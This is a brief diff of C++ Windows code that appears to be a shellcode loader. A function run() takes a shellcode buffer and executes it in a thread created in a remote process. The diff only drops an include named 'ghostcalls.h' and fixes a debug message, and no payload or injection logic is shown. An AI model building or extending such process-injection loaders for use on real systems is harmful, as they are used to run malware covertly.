@@ -5,7 +5,6 @@
 #include <Windows.h>
 #include "base64.h"
 #include <string>
-#include "ghostcalls.h"
 
 
 using std::cout;
@@ -201,7 +200,7 @@ void run(unsigned char* sc, size_t scLen) {
 		exit(7);
 	}
 	else {
-		if (DEBUG_MODE) cout << "Successfully created and executing thread in remote thread in" << endl;
+		if (DEBUG_MODE) cout << "Successfully created and executing thread in remote process" << endl;
 	}
 
 	CloseHandle(processHandle);
